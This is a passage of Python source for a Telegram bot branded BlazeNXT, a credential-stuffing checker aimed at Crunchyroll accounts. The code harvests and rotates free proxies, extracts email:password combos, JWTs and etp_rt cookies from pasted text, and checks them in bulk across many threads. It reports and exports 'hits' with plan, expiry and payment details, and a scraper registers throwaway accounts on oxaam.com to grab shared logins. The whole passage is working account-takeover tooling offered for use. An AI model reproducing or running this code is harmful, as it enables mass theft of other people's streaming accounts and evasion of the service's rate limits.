            return random.choice(LIVE_PROXIES)
    return None

def harvest_proxies() -> List[str]:
    raw = set()
    s = requests.Session()
    for url in PROXY_SOURCES:
        try:
            r = s.get(url, timeout=10, headers={"User-Agent": BARO_WUA})
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "://" in line:
                        line = line.split("://", 1)[-1]
                    line = line.split("/")[0]
                    if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", line):
                        raw.add(line)
        except requests.RequestException:
            continue
    return list(raw)

def test_one_proxy(proxy_str: str) -> Optional[dict]:
    """proxy_str = host:port. Tries http, then socks5 (if PySocks available)."""
    schemes = ["http"]
    if SOCKS5_OK:
        schemes.append("socks5")
    for scheme in schemes:
        proxies = {"http": f"{scheme}://{proxy_str}", "https": f"{scheme}://{proxy_str}"}
        for url in PROXY_TEST_URLS:
            try:
                r = requests.get(url, proxies=proxies, timeout=PROXY_TEST_TIMEOUT,
                                 headers={"User-Agent": BARO_WUA})
                if r.status_code in (200, 204):
                    return proxies
            except requests.RequestException:
                continue
    return None

def test_proxy_url(proxy_url: str) -> Optional[dict]:
    """proxy_url = full url (scheme://[user:pass@]host:port)."""
    for url in PROXY_TEST_URLS:
        try:
            r = requests.get(url, proxies={"http": proxy_url, "https": proxy_url},
                             timeout=PROXY_TEST_TIMEOUT, headers={"User-Agent": BARO_WUA})
            if r.status_code in (200, 204):
                return {"http": proxy_url, "https": proxy_url}
        except requests.RequestException:
            continue
    return None

def refresh_live_proxies(force: bool = False) -> None:
    global LIVE_PROXIES, LAST_PROXY_HARVEST
    now = time.time()
    with PROXY_LOCK:
        fresh = LIVE_PROXIES and (now - LAST_PROXY_HARVEST) < PROXY_REFRESH_MINUTES * 60
    if not force and fresh:
        return
    if not _refresh_busy.acquire(blocking=False):
        return  # another refresh already running
    try:
        logger.info("Refreshing live proxy pool...")
        candidates = harvest_proxies()
        if not candidates:
            logger.warning("No proxies harvested")
            return
        random.shuffle(candidates)
        to_test = candidates[:PROXY_TEST_SAMPLE]
        live = []
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = {ex.submit(test_one_proxy, p): p for p in to_test}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                except Exception:
                    continue
                if res:
                    live.append(res)
                    if len(live) >= MAX_PROXIES_TO_KEEP:
                        break
        with PROXY_LOCK:
            LIVE_PROXIES = live
            LAST_PROXY_HARVEST = now
        logger.info("Live proxies ready: %d", len(live))
    finally:
        _refresh_busy.release()

def ensure_proxies() -> None:
    if proxy_count() == 0:
        _load_pool_into_live()
        if proxy_count() == 0:
            refresh_live_proxies(force=True)

def _proxy_loop() -> None:
    while True:
        try:
            refresh_live_proxies(force=False)
        except Exception as e:
            logger.warning("Proxy loop error: %s", e)
        time.sleep(PROXY_REFRESH_MINUTES * 60)

# ---------------- Custom proxy pool (user-added, persistent) ----------------
def pool_load() -> List[str]:
    try:
        if POOL_FILE.exists():
            return [l.strip() for l in POOL_FILE.read_text(encoding="utf-8").splitlines() if l.strip()]
    except OSError:
        pass
    return []

def pool_save(items: List[str]):
    try:
        POOL_FILE.write_text("\n".join(items) + ("\n" if items else ""), encoding="utf-8")
    except OSError as e:
        logger.warning("Pool save failed: %s", e)

def pool_size() -> int:
    return len(pool_load())

def normalize_proxy(line: str) -> Optional[str]:
    """Accepts host:port | user:pass:host:port | scheme://... -> full url."""
    line = (line or "").strip()
    if not line:
        return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    parts = line.split(":")
    if len(parts) == 4 and parts[0] and parts[2] and parts[3].isdigit():
        return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    if len(parts) == 2 and parts[0] and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    return None

def _merge_live(items: List[dict]):
    with PROXY_LOCK:
        have = {p.get("https") for p in LIVE_PROXIES}
        for p in items:
            if p.get("https") not in have:
                LIVE_PROXIES.append(p)
                have.add(p.get("https"))

def _load_pool_into_live():
    items = pool_load()
    if items:
        _merge_live([{"http": p, "https": p} for p in items])

def add_proxies_to_pool(lines: List[str], auto_check: bool = True):
    """Add user-pasted proxies. Returns (added, invalid)."""
    existing = pool_load()
    have = set(existing)
    added = invalid = 0
    for ln in lines:
        p = normalize_proxy(ln)
        if not p:
            if ln.strip():
                invalid += 1
            continue
        if p in have:
            continue
        existing.append(p)
        have.add(p)
        added += 1
    pool_save(existing)
    if added:
        if auto_check:
            threading.Thread(target=_background_test_pool, daemon=True).start()
        else:
            _merge_live([{"http": p, "https": p} for p in existing])
    return added, invalid

def _background_test_pool():
    """Auto-check: background-test the whole custom pool, keep the live ones.

    Only pool URLs are swapped out — harvested free proxies stay untouched.
    """
    pool_urls = set(pool_load())
    tested = []
    for p in pool_urls:
        res = test_proxy_url(p)
        if res:
            tested.append(res)
    with PROXY_LOCK:
        LIVE_PROXIES[:] = [x for x in LIVE_PROXIES if x.get("https") not in pool_urls]
        _merge_live(tested)
    logger.info("Pool auto-check done: %d live", len(tested))

def clear_pool():
    global LAST_PROXY_HARVEST
    pool_save([])
    with PROXY_LOCK:
        LIVE_PROXIES.clear()
        LAST_PROXY_HARVEST = time.time()  # don't let the loop refill immediately

# ===================== CREDENTIAL EXTRACTION =====================
EMAIL_PASS_RE = re.compile(
    r"([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}):([^\s\"'<>,]{3,128})"
)
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}")
LABELED_TOKEN_RE = re.compile(
    r"(?:access[_-]?token|token|bearer)\s*[:=]\s*[\"']?([A-Za-z0-9_\-.+/=]{20,})", re.I
)
ETP_RT_RE = re.compile(r"etp_rt[\"'\s:=]+([A-Za-z0-9+/=._\-]{16,})", re.I)

def extract_credentials(text: str) -> List[dict]:
    """Pull email:pass lines, JWT/Bearer tokens and etp_rt cookies out of any text."""
    creds: List[dict] = []
    seen = set()

    for m in EMAIL_PASS_RE.finditer(text):
        email, pw = m.group(1), m.group(2)
        key = ("email", email.lower())
        if key not in seen:
            seen.add(key)
            creds.append({"type": "email", "value": email, "password": pw})

    for m in JWT_RE.finditer(text):
        val = m.group(0)
        key = ("token", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "token", "value": val})

    for m in LABELED_TOKEN_RE.finditer(text):
        val = m.group(1).strip().rstrip("\"'")
        if len(val) < 20 or val.lower().startswith(("null", "undefined")):
            continue
        key = ("token", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "token", "value": val})

    for m in ETP_RT_RE.finditer(text):
        val = m.group(1).strip()
        key = ("cookie", val[:60])
        if key not in seen:
            seen.add(key)
            creds.append({"type": "cookie", "value": val})

    return creds

# ===================== CHECKER ENGINE =====================
def run_check(text: str, reporter=None, hit_callback=None) -> dict:
    """Thread-pool check of all credentials. Premium counters: hit/free/bad/rate/err/2fa + live feed + cpm."""
    ensure_proxies()
    creds = extract_credentials(text)
    results = {
        "hits": [], "free": [],
        "bad": 0, "rate": 0, "err": 0, "twofa": 0,
        "total": len(creds), "processed": 0,
        "t0": time.time(),
        "live_feed": [],
        "seconds": 0,
        "cpm": 0,
        "elapsed": 0,
    }
    if not creds:
        results["seconds"] = 0
        return results

    lock = threading.Lock()
    px_idx = [0]

    def next_proxy() -> Optional[dict]:
        """Round-robin proxy hand-out (Baron style)."""
        with PROXY_LOCK:
            if not LIVE_PROXIES:
                return None
            with lock:
                p = LIVE_PROXIES[px_idx[0] % len(LIVE_PROXIES)]
                px_idx[0] += 1
            return p

    def worker(cred: dict):
        try:
            r = check_credential(cred, next_proxy())
            return cred, r["st"], r["data"]
        except Exception as e:
            return cred, "err", dict(_blank_data(""), info=_clean_err(e))

    t0 = time.time()
    results["t0"] = t0
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(worker, c): c for c in creds}
        for fut in as_completed(futures):
            cred = futures[fut]
            try:
                orig_cred, st, d = fut.result()
            except Exception as e:
                orig_cred, st, d = cred, "err", dict(_blank_data(""), info=_clean_err(e))
            with lock:
                results["processed"] += 1
                # live feed: keep last 5 checked emails (for premium card)
                try:
                    feed_val = orig_cred.get("value", "") if isinstance(orig_cred, dict) else str(orig_cred)
                    if orig_cred.get("type") == "email":
                        feed_val = orig_cred.get("value", "")
                    else:
                        feed_val = feed_val[:40]
                    results["live_feed"].append(feed_val)
                    if len(results["live_feed"]) > 5:
                        results["live_feed"].pop(0)
                except Exception:
                    pass
                if st == "hit":
                    entry = {"cred": orig_cred, "data": d, "st": "hit"}
                    results["hits"].append(entry)
                    # Immediate hit delivery — don't wait for full scan
                    if hit_callback:
                        try:
                            hit_callback(entry)
                        except Exception:
                            pass
                elif st == "free":
                    results["free"].append({"cred": orig_cred, "data": d, "st": "free"})
                elif st == "bad":
                    results["bad"] += 1
                elif st == "rate":
                    results["rate"] += 1
                elif st == "2fa":
                    results["twofa"] += 1
                else:
                    results["err"] += 1
                # update elapsed/cpm for progress
                elapsed = time.time() - t0
                results["elapsed"] = elapsed
                results["cpm"] = _fmt_cpm(results["processed"], elapsed)
                # throttled live update every 2 checks + interval in reporter
                if reporter and results["processed"] % 2 == 0:
                    try:
                        reporter.update(results)
                    except Exception:
                        pass
    elapsed = time.time() - t0
    results["seconds"] = round(elapsed, 1)
    results["elapsed"] = elapsed
    results["cpm"] = _fmt_cpm(results["processed"], elapsed)
    if reporter:
        try:
            reporter.update(results)
            reporter.wait()
        except Exception:
            pass
    return results

def _cred_value(cred: dict) -> str:
    if cred["type"] == "email":
        return f"{cred['value']}:{cred.get('password', '')}"
    return cred["value"]

def make_export(accounts: List[dict], fmt: str = "txt") -> str:
    fd, path = tempfile.mkstemp(suffix=f".{fmt}", prefix="crunchy_")
    os.close(fd)
    p = Path(path)
    if fmt == "json":
        with open(p, "w", encoding="utf-8") as f:
            json.dump(accounts, f, indent=2, ensure_ascii=False, default=str)
    elif fmt == "csv":
        with open(p, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["combo", "type", "status", "plan", "expiry", "days_left", "country", "streams"])
            for a in accounts:
                d = a.get("data") or {}
                w.writerow([
                    _cred_value(a["cred"]), a["cred"]["type"],
                    "HIT" if a.get("st") == "hit" else "FREE",
                    d.get("plan", ""), d.get("expiry", ""), d.get("days_left", ""),
                    d.get("country_name", ""), d.get("streams", ""),
                ])
    else:
        with open(p, "w", encoding="utf-8") as f:
            for a in accounts:
                d = a.get("data") or {}
                status = "HIT" if a.get("st") == "hit" else "FREE"
                flag = flag_emoji(d.get("cc"))
                f.write(
                    f"{_cred_value(a['cred'])} | {status} | Plan: {d.get('plan') or 'Premium'} | "
                    f"Expiry: {d.get('expiry') or '?'} | Days: {d.get('days_left') or '?'} | "
                    f"Country: {flag + ' ' if flag else ''}{d.get('country_name') or '?'} | "
                    f"Streams: {d.get('streams') or '?'}\n"
                )
    return str(p)

# ===================== OXAAM SCRAPER (from cc2.py, bug-fixed) =====================
OXAAM_BASE = "https://www.oxaam.com/"
OXAAM_FREE = "https://www.oxaam.com/freeservice.php"

def _oxaam_headers() -> dict:
    return {
        "User-Agent": BARO_WUA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.oxaam.com",
        "Referer": "https://www.oxaam.com/",
    }

def _find_password(block: str) -> Optional[str]:
    m = re.search(r"[Pp]ass(?:word)?\s*[:=]\s*([^\s<>\"'`,;]{6,})", block)
    if m:
        return m.group(1)
    m = re.search(r"\"password\"\s*:\s*\"([^\"]{6,})\"", block)
    if m:
        return m.group(1)
    return None

def parse_oxaam(html: str):
    """Robust credential extraction — no NameErrors, no magic line numbers."""
    if BeautifulSoup is not None:
        try:
            soup = BeautifulSoup(html, "html.parser")
            for details in soup.find_all("details"):
                summary = details.find("summary")
                title = summary.get_text(" ", strip=True) if summary else details.get_text(" ", strip=True)
                if not re.search(r"crunch|krunsh", title, re.I):
                    continue
                block = str(details)
                em = re.search(r"[\w.\-]+@[\w.\-]+\.\w+", block)
                if not em:
                    continue
                email = em.group(0)
                pw = _find_password(block)
                if pw:
                    return email, pw
        except Exception as e:
            logger.warning("Oxaam details-parse failed: %s", e)
    m = EMAIL_PASS_RE.search(html)
    if m:
        return m.group(1), m.group(2)
    return None, None

def oxaam_fetch(proxy: dict | None = None):
    """Register on the site and pull a fresh Crunchyroll credential. Returns (email, password)."""
    # Try both www and non-www, with and without proxy, with retries
    import time as _t
    bases = [OXAAM_BASE, OXAAM_BASE.replace("www.", ""), "https://oxaam.com/", "https://www.oxaam.com/"]
    # deduplicate
    bases = list(dict.fromkeys(bases))
    for base in bases:
        free_url = base.rstrip("/") + "/freeservice.php"
        dash_url = base.rstrip("/") + "/dashboard.php"
        for attempt in range(2):
            name = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
            email = f"{name}_{random.randint(100, 999)}@gmail.com"
            password = (
                "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
                + str(random.randint(100, 999))
                + "@"
                + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4))
            )
            data = {
                "name": name,
                "email": email,
                "phone": "9" + "".join(random.choices("0123456789", k=9)),
                "password": password,
                "country": "India",
            }
            try:
                s = requests.Session()
                # Oxaam needs cookies — GET base first to init session
                try:
                    s.get(base, headers=_oxaam_headers(), timeout=20, proxies=proxy)
                except Exception:
                    pass
                # POST register (some versions use /register.php, try both)
                resp = None
                for reg_url in [base, base.rstrip("/") + "/register.php", base.rstrip("/") + "/signup.php"]:
                    try:
                        resp = s.post(reg_url, data=data, headers=_oxaam_headers(), timeout=30, proxies=proxy)
                        if resp.status_code in (200, 302):
                            break
                    except requests.RequestException:
                        continue
                # slight delay
                _t.sleep(0.8)
                # GET freeservice
                r = s.get(free_url, headers={**_oxaam_headers(), "Referer": dash_url}, timeout=30, proxies=proxy)
                if r.status_code != 200:
                    logger.warning("Oxaam GET %s -> %s", free_url, r.status_code)
                    continue
                html = r.text or ""
                # Debug: if site returns login page or captcha, log snippet
                if len(html) < 500:
                    logger.warning("Oxaam short html %s: %s", free_url, html[:500])
                # Try to parse
                em, pw = parse_oxaam(html)
                if em and pw:
                    logger.info("Oxaam hit via %s (attempt %s)", base, attempt+1)
                    return em, pw
                # Fallback: search any email:pass in page even without details
                if "crunch" in html.lower() or "@" in html:
                    # Log first 2k for debug
                    logger.info("Oxaam no hit but html snippet: %s", html[:2000].replace("\n"," "))
                # Retry with different base
            except requests.RequestException as e:
                logger.warning("Oxaam fetch error %s (%s): %s", base, attempt+1, e)
                # try without proxy on second attempt
                if proxy and attempt == 0:
                    proxy = None
                    continue
            except Exception as e:
                logger.warning("Oxaam unexpected %s: %s", base, e)
            _t.sleep(1.2)
    return None, None

# ===================== PERSISTENT STORE (codes + grants + settings) =====================
class Store:
    def __init__(self, path: Path):
        self.path = path
        self.lock = threading.RLock()
        self.codes: Dict[str, dict] = {}
        self.users: Dict[str, dict] = {}
        self.settings: Dict[str, object] = {}
        self._load()

    def _load(self):
        try:
            if self.path.exists():
                data = json.loads(self.path.read_text(encoding="utf-8"))
                self.codes = data.get("codes", {})
                self.users = data.get("users", {})
                self.settings = data.get("settings", {})
        except Exception as e:
            logger.warning("Store load failed: %s", e)

    def save(self):
        with self.lock:
            try:
                tmp = self.path.with_suffix(".tmp")
                tmp.write_text(
                    json.dumps({"codes": self.codes, "users": self.users, "settings": self.settings},
                               indent=2),
                    encoding="utf-8",
                )
                os.replace(tmp, self.path)
            except Exception as e:
                logger.warning("Store save failed: %s", e)

    def get_setting(self, key, default=None):
        with self.lock:
            return self.settings.get(key, default)

    def set_setting(self, key, value):
        with self.lock:
            self.settings[key] = value
            self.save()

    def has_access(self, uid: int):
        with self.lock:
            if uid in ADMIN_IDS:
                return True, now_utc()
            info = self.users.get(str(uid))
            if info:
                exp = parse_iso(info.get("expiry"))
                if exp and exp > now_utc():
                    return True, exp
                self.users.pop(str(uid), None)
                self.save()
            return False, None

    def redeem(self, code: str, uid: int):
        """Returns an expiry datetime on success, or 'invalid' | 'used' | 'expired'."""
        code = (code or "").strip().upper()
        with self.lock:
            data = self.codes.get(code)
            if not data:
                return "invalid"
            if data.get("used_by") is not None:
                return "used"
            exp = parse_iso(data.get("expiry"))
            if not exp or exp < now_utc():
                self.codes.pop(code, None)
                self.save()
                return "expired"
            data["used_by"] = uid
            self.users[str(uid)] = {
                "expiry": data.get("expiry"),
                "premium_only": PREMIUM_ONLY_DEFAULT,
            }
            self.save()
            return exp

    def add_code(self, code: str, hours: int) -> datetime:
        exp = now_utc() + timedelta(hours=hours)
        with self.lock:
            self.codes[code] = {"expiry": exp.isoformat(), "used_by": None}
            self.save()
        return exp

    def set_premium_only(self, uid: int, val: bool):
        with self.lock:
            info = self.users.setdefault(str(uid), {})
            info["premium_only"] = bool(val)
            self.save()

    def get_premium_only(self, uid: int) -> bool:
        with self.lock:
            info = self.users.get(str(uid))
            if info and "premium_only" in info:
                return bool(info["premium_only"])
        return PREMIUM_ONLY_DEFAULT

    def active_user_count(self) -> int:
        with self.lock:
            now = now_utc()
            return sum(
                1 for d in self.users.values()
                if (parse_iso(d.get("expiry")) or datetime.min.replace(tzinfo=timezone.utc)) > now
            )

STORE: Optional[Store] = None

# ===================== PROGRESS (thread-safe, BlazeNXT PREMIUM bar) =====================
def _bar(pct: int, width: int = 20) -> str:
    filled = int(pct / 100 * width)
    return "█" * filled + "░" * (width - filled)

def _live_feed_block(res: dict) -> str:
    feed = res.get("live_feed") or []
    if not feed:
        return "  <i>—</i>"
    # show last 3
    last = feed[-3:]
    return "\n".join(f"  {esc(x)}" for x in last)

def progress_text(res: dict) -> str:
    total = res.get("total") or 0
    processed = res.get("processed", 0)
    # Premium: show one decimal for <10% to match BlazeNXT screenshot 0.6%
    raw_pct = (processed / total * 100) if total else 0
    if raw_pct < 10 and raw_pct != 0:
        pct_str = f"{raw_pct:.1f}"
        pct = int(raw_pct)  # for bar
    else:
        pct_str = str(int(raw_pct))
        pct = int(raw_pct)
    # CPM / elapsed / ETA premium
    elapsed = res.get("elapsed") or (time.time() - res.get("t0", time.time())) if res.get("t0") else 0
    cpm = res.get("cpm") if res.get("cpm") is not None else _fmt_cpm(processed, elapsed)
    eta = _fmt_eta(total, processed, cpm)
    elapsed_s = _fmt_duration(elapsed) if elapsed else "0m 0s"
    twofa = res.get("twofa", 0)
    # Keep legacy first two lines EXACT for backward-compat tests, then add premium block
    legacy = (
        f"⏳ Crunchyroll {pct_str}% [{_bar(pct)}] ({processed}/{total})\n"
        f"✅ Hits: {len(res.get('hits', []))} | 🆓 Free: {len(res.get('free', []))} | "
        f"❌ Bad: {res.get('bad',0)} | ⏳ Rate: {res.get('rate',0)} | ⚠️ Errors: {res.get('err',0)}"
    )
    # Detailed: success rate
    success_rate = (len(res.get('hits', [])) / processed * 100) if processed else 0
    premium = (
        f"╭────────────────────────╮\n"
        f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
        f"╰────────────────────────╯\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{legacy}\n"
        f"🔐 2FA: <code>{twofa}</code> | 🌐 Proxies: <code>{proxy_count()}</code> | ✅ Rate: <code>{success_rate:.1f}%</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 <code>{cpm} cpm</code>  🕒 <code>{elapsed_s}</code>  ⏳ ETA <code>{eta}</code>\n"
        f"• Checked: <code>{processed}/{total}</code>  • {pct_str}% • ✅ <code>{len(res.get('hits', []))}</code> hits\n"
        f"📡 <b>Live feed:</b>\n"
        f"{_live_feed_block(res)}"
    )
    return premium

class ProgressReporter:
    """Updates a Telegram message from worker threads without blocking."""

    def __init__(self, message, loop: asyncio.AbstractEventLoop, interval: float = 1.8):
        self.message = message
        self.loop = loop
        self.interval = interval
        self.last = 0.0
        self.tasks: List = []

    def update(self, res: dict):
        now = time.time()
        if now - self.last < self.interval:
            return
        self.last = now
        try:
            fut = asyncio.run_coroutine_threadsafe(self._edit(progress_text(res)), self.loop)
            self.tasks.append(fut)
        except Exception:
            pass

    async def _edit(self, text: str):
        try:
            await self.message.edit_text(text, parse_mode=ParseMode.HTML)
        except BadRequest:  # "message is not modified" etc. — safe to ignore
            pass
        except Exception:
            pass

    def wait(self):
        for t in self.tasks:
            try:
                t.result(timeout=10)
            except Exception:
                pass
        self.tasks.clear()

# ===================== FORMATTING — BlazeNXT PREMIUM =====================
def access_denied_html() -> str:
    return (
        "✅ <b>Free Bot</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "This bot is FREE — no code needed!\n"
        "Just tap <b>💎 Check Account</b> to start.\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
    )

def hit_card(entry: dict) -> str:
    """⭐ CRUNCHYROLL HIT! — compact attractive (user requested)"""
    cred, d = entry["cred"], entry.get("data") or {}
    L = []
    L.append("⭐ <b>CRUNCHYROLL HIT!</b>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    if cred["type"] == "email":
        L.append(f"📧 Email: <code>{esc(cred['value'])}</code>")
        L.append(f"🔑 Password: <code>{esc(cred.get('password', ''))}</code>")
    else:
        L.append(f"🔑 {cred['type'].title()}: <code>{esc(cred['value'][:60])}</code>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    plan = d.get("plan") or "Premium"
    L.append(f"• Plan: <code>{esc(plan)}</code>")
    L.append(f"• Premium: ✅")
    if d.get("expiry") or d.get("next_renewal"):
        L.append(f"• Expiry: <code>{esc(d.get('expiry') or d.get('next_renewal') or 'N/A')}</code>")
    if d.get("days_left"):
        L.append(f"• Days Left: <code>{esc(str(d.get('days_left')))}</code>")
    L.append(f"• Auto Renew: {'✅' if d.get('renew') else '❌'}")
    L.append(f"• Free Trial: {'✅' if d.get('trial') else '❌'}")
    if d.get("duration") or d.get("billing_cycle"):
        L.append(f"• Plan Duration: <code>{esc(d.get('duration') or d.get('billing_cycle') or 'N/A')}</code>")
    price = str(d.get("price") or "0")
    if d.get("currency"):
        price += f" {d.get('currency')}"
    L.append(f"• Plan Price: <code>{esc(price.strip())}</code>")
    if d.get("plan_type"):
        L.append(f"• Plan Type: <code>{esc(d.get('plan_type'))}</code>")
    L.append(f"• Email Verified: {'✅' if d.get('verified') else '❌'}")
    if d.get("created") or d.get("start_date"):
        L.append(f"• Created Date: <code>{esc(d.get('created') or d.get('start_date') or 'N/A')}</code>")
    if d.get("payment") or d.get("payment_method"):
        L.append(f"• Last Payment: <code>{esc(d.get('payment') or d.get('payment_method') or 'N/A')}</code>")
    if d.get("cc") or d.get("country_name"):
        flag = flag_emoji(d.get("cc"))
        country = d.get("country_name") or d.get("cc") or "N/A"
        L.append(f"• Country: {flag + ' ' if flag else ''}<code>{esc(country)}</code>")
    if d.get("streams"):
        L.append(f"• Streams: <code>{esc(str(d.get('streams')))}</code>")
    if d.get("user") and d["user"] != (cred.get("value", "").split("@")[0] if cred.get("value") else ""):
        L.append(f"• User: <code>{esc(d.get('user'))}</code>")
    if d.get("sub_id"):
        L.append(f"• Sub ID: <code>{esc(d.get('sub_id')[:20])}</code>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    L.append("🔥 <b>BlazeNXT</b>")
    return "\n".join(L)

def summary_text(res: dict) -> str:
    # Keep legacy lines for compat, wrap in premium header/footer
    hits = len(res.get('hits', []))
    free = len(res.get('free', []))
    bad = res.get('bad', 0)
    rate = res.get('rate', 0)
    err = res.get('err', 0)
    twofa = res.get('twofa', 0)
    total = res.get('total', 0)
    processed = res.get('processed', 0)
    sec = res.get('seconds', '?')
    cpm = res.get('cpm', 0)
    elapsed = res.get('elapsed', 0)
    if not cpm and elapsed:
        cpm = _fmt_cpm(processed, elapsed)
    # legacy block (must stay exactly for tests)
    legacy = (
        f"📊 Total: <code>{total}</code> | Processed: <code>{processed}</code>\n"
        f"✅ Hits: <code>{hits}</code> | 🆓 Free: <code>{free}</code> | "
        f"❌ Bad: <code>{bad}</code>\n"
        f"⏳ Rate: <code>{rate}</code> | ⚠️ Errors: <code>{err}</code>\n"
        f"⏱ Time: <code>{sec}s</code> | 🌐 Live Proxies: <code>{proxy_count()}</code>"
    )
    # premium wrapper - BlazeNXT clean (no tagline if user chose no_tagline, but keep BlazeNXT branding)
    extra = f"🔐 2FA: <code>{twofa}</code> | 📈 Avg: <code>{cpm} cpm</code>" if twofa or cpm else ""
    extra_block = f"{extra}\n" if extra else ""
    # Detailed breakdown
    detailed = ""
    if res.get("hits"):
        # Plan breakdown
        from collections import Counter
        plans = Counter((h.get("data") or {}).get("plan") or "Premium" for h in res.get("hits", []))
        plan_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in plans.items())
        # Country breakdown (top 3)
        ccs = Counter((h.get("data") or {}).get("country_name") or (h.get("data") or {}).get("cc") or "Unknown" for h in res.get("hits", []))
        cc_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in ccs.most_common(3))
        # Success rate
        total = res.get("total", 0) or 1
        rate = len(res.get("hits", [])) / total * 100
        detailed = (
            f"📊 Plans: {plan_line}\n"
            f"🌍 Countries: {cc_line}\n"
            f"✅ Success: <code>{rate:.1f}%</code> • ⏱ Avg: <code>{res.get('cpm',0)} cpm</code>\n"
        )
    return (
        "╭────────────────────────╮\n"
        "│ ✅ <b>SCAN COMPLETE!</b> │\n"
        "╰────────────────────────╯\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"{legacy}\n"
        f"{extra_block}"
        f"{detailed}"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>BlazeNXT</b>"
    )

def status_text() -> str:
    ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
    return (
        "📊 <b>BlazeNXT — Bot Status</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Owner: <code>{esc(OWNER_USERNAME)}</code>\n"
        f"🌐 Live Proxies: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n"
        f"⚙️ Auto-Check Proxies: <code>{'ON' if ac else 'OFF'}</code>\n"
        f"👥 Active Users: <code>{STORE.active_user_count() if STORE else 0}</code>\n"
        f"🧵 Threads: <code>{THREADS}</code>\n"
        f"🔁 Proxy Refresh: <code>{PROXY_REFRESH_MINUTES} min</code>\n"
        f"⏱ Uptime: <code>{uptime()}</code>\n"
        f"✅ Checks This Session: <code>{CHECKS_DONE}</code>\n"
        f"🧩 SOCKS5: <code>{'Yes' if SOCKS5_OK else 'No (missing pysocks)'}</code>\n"
        f"💎 Default Mode: <code>{'Premium Only' if PREMIUM_ONLY_DEFAULT else 'All Working'}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>BlazeNXT</b>"
    )

def help_text() -> str:
    return (
        "╭────────────────────────╮\n"
        "│  📖 <b>HOW TO USE</b> — BlazeNXT  │\n"
        "╰────────────────────────╯\n"
        "┌─ <b>🚀 QUICK START (3 STEPS)</b> ┐\n"
        "│ <b>Step 1:</b> Tap <code>💎 Check Account</code>\n"
        "│   └ Paste <code>EMAIL:PASS</code> — one per line\n"
        "│   └ Ex: <code>test@gmail.com:mypass123</code>\n"
        "│ <b>Step 2:</b> Tap <code>📂 Check File</code>\n"
        "│   └ Send <code>.txt/.csv/.json/.log</code> file\n"
        "│   └ Auto-extracts, supports 10k+ lines 📦\n"
        "│ <b>Step 3:</b> Wait for LIVE scan ⏳\n"
        "│   └ Hits sent <b>instantly</b> as found ⚡\n"
        "│   └ Export <code>TXT + JSON</code> auto at end 📁\n"
        "└────────────────────────┘\n"
        "┌─ <b>✨ FEATURES</b> ───────────┐\n"
        "│ ⚡ <b>Speed:</b> <code>120 threads</code> → <code>300 max</code> via Tools\n"
        "│   └ 4-5/sec • <code>500-600 cpm</code> with good proxies\n"
        "│ 🌐 <b>Proxies:</b> Upload txt (<code>ip:port</code> or <code>user:pass@ip:port</code>)\n"
        "│   └ Auto-checked, more reliable than scrap 🔍\n"
        "│ 🎯 <b>Deep Check:</b> Fan / Mega / Ultimate • Expiry • Price • Trial\n"
        "│ 🔐 <b>Smart:</b> 2FA / Rate / Errors handled\n"
        "└────────────────────────┘\n"
        "┌─ <b>⚙️ PROXY SYSTEM</b> ┐\n"
        "│ ♻️ Auto-Fetch + 📥 Manual Upload\n"
        "│ 📊 Proxy Settings: Status, Loaded, Live\n"
        "│ 🧵 Set Threads: 50/100/200/300\n"
        "│ 🔄 Auto-refresh • 📤 Upload txt\n"
        "└────────────────────────┘\n"
        "╭────────────────────────╮\n"
        "│  🔥 <b>BlazeNXT</b> • <i>Fast • Free • Deep</i> 🔥  │\n"
        "╰────────────────────────╯\n"
        f"👤 Owner: <code>{esc(OWNER_USERNAME)}</code> • 💬 Support: <code>{esc(OWNER_USERNAME)}</code>"
    )

def welcome_premium_text(uid: int, name: str) -> str:
    # FREE MODE UI — clean, modern, no subscription gate
    is_owner = is_admin(uid)
    if is_owner:
        access_line = "👑 <b>Owner</b> • <code>Unlimited</code> ♾️"
    else:
        access_line = "✅ <b>Free Access</b> • <code>Unlimited</code> 🎉"
    # Fancy header with stats
    return (
        "╭────────────────────────╮\n"
        "│  🔥 <b>BlazeNXT</b> — <i>CRUNCHYROLL</i> 🔥  │\n"
        "│  <i>Premium Checker • FREE</i>   │\n"
        "╰────────────────────────╯\n"
